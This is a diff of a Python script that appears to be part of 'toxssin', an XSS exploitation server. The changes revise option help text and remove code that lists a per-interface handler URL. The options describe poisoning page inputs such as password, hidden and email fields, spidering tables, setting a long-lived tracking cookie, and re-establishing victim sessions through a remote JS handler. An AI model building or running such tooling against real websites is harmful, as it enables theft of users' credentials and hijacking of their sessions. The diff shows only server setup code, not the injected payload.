@@ -65,11 +65,11 @@ parser.add_argument("-c", "--certfile", action="store", help = "Your certificate
 parser.add_argument("-k", "--keyfile", action="store", help = "The private key for your certificate. ", required = True)
 parser.add_argument("-p", "--port", action="store", help = "Your toxssin server port (default: 443)", type = int) 
 parser.add_argument("-s", "--script-name", action="store", help = "Change JS handler script name (default: handler.js)", type=str)
-parser.add_argument("-e", "--elements", action="store", help = "Html elements to poison (default: input[type='text'], input[type='password'], input[type='date'], input[type='email'], input[type='datetime-local'], input[type='hidden'], input[type='number'], input[type='search'], input[type='url'], input[type='radio'], input[type='checkbox'], select, textarea)", type=str)
+parser.add_argument("-e", "--elements", action="store", help = "Html elements to poison (default: input[type='text'], input[type='password'], input[type='date'], input[type='email'], input[type='datetime-local'], input[type='hidden'], input[type='number'], input[type='search'], input[type='url'], input[type='radio'], input[type='checkbox'], select, textarea)\n*Forms, tables and file inputs are poisoned by default.", type=str)
 parser.add_argument("-f", "--frequency", action="store", help = "Change html elements poisoning cycle frequency (default: 3000 ms)", type=int)
 parser.add_argument("-a", "--cookie-age", action="store", help = "Toxssin cookie max age in days (default: 30)", type=int)
 parser.add_argument("-t", "--no-tables", action="store_true", help = "Disable html tables spidering")
-parser.add_argument("-g", "--grab-poisoned", action="store_true", help = "Identify and re-establish sessions sourcing from cached content (default: False).")
+parser.add_argument("-g", "--grab-poisoned", action="store_true", help = "Identify and re-establish sessions sourcing from cached content (default: False)")
 parser.add_argument("-v", "--verbose", action="store_true", help = "Verbose output (prepare for long stdout)")
 parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup")
 
@@ -646,20 +646,11 @@ def main():
 			ssl_version=ssl.PROTOCOL_TLS
 		)
 		
-		interfaces = { 
-			'wlan0' : check_output("ip addr show wlan0 2>/dev/null | grep \"inet \" | awk '{ print $2 }' | awk -F \"/\" '{ print $1 }'", shell = True).decode(sys.stdout.encoding),
-			'eth0' : check_output("ip addr show eth0 2>/dev/null | grep \"inet \" | awk '{ print $2 }' | awk -F \"/\" '{ print $1 }'", shell = True).decode(sys.stdout.encoding),
-			'tun0' : check_output("ip addr show tun0 2>/dev/null | grep \"inet \" | awk '{ print $2 }' | awk -F \"/\" '{ print $1 }'", shell = True).decode(sys.stdout.encoding) 
-		}
 		
 		chill() if quiet else print_banner()
 		port = f':{server_port}' if server_port != 443 else ''
 			
 		print(f'[{get_dt_prefix()[1]}] [{INFO}] {BOLD}Provided domain handler URL{END}: {ORANGE}{toxssin_server_url}{port}/{handler}{END}')
-		
-		for nic in ['wlan0', 'eth0', 'tun0']:
-			if interfaces[nic] != '':			
-				print(f'[{get_dt_prefix()[1]}] [{INFO}] {BOLD}{nic} iface handler URL{END}: {ORANGE}https://{interfaces[nic].strip()}{port}/{handler}{END}')
 		
 		try:
 			server_public_ip = check_output("curl --connect-timeout 3.14 -s ifconfig.me", shell = True).decode(sys.stdout.encoding)	
